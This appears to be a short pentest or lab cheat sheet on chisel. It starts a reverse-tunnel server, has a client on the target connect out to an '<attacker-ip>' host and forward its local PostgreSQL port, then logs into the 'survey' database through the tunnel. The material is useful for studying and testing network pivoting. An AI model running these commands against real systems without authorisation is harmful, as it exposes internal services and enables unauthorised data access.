# chisel
- server and client in a single binary
- runs on linux and/or windows
1. Run the server
```
chisel server --socks5 --reverse
```
Example output
```
$ chisel server --socks5 --reverse
2024/12/25 18:44:39 server: Reverse tunnelling enabled
2024/12/25 18:44:39 server: Fingerprint nhPTxim2cD4wf1js50X038Zl4o7v5wfwCrdC0doFuy8=
2024/12/25 18:44:39 server: Listening on http://0.0.0.0:8080
```

2. Connect to the server and forward 1337 to 5432 to expose the PSQL database
```
chisel client <attacker-ip>:8080 R:1337:127.0.0.1:5432
```
Example output
```
$ ./chisel client 10.10.14.43:8080 R:1337:127.0.0.1:5432
2024/12/26 00:46:13 client: Connecting to ws://10.10.14.43:8080
2024/12/26 00:46:13 client: Connected (Latency 8.141219ms)
```

3. Verify connection at the server
```
$ chisel server --socks5 --reverse
2024/12/25 18:44:39 server: Reverse tunnelling enabled
2024/12/25 18:44:39 server: Fingerprint nhPTxim2cD4wf1js50X038Zl4o7v5wfwCrdC0doFuy8=
2024/12/25 18:44:39 server: Listening on http://0.0.0.0:8080
2024/12/25 18:46:12 server: session#1: tun: proxy#R:1337=>5432: Listening
```

4. Connect through the tunnel
```
$ psql -U db_user -h 127.0.0.1 -p 1337 survey
Password for user db_user: 
psql (15.8 (Debian 15.8-0+deb12u1), server 14.15 (Ubuntu 14.15-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
Type "help" for help.

survey=>
```
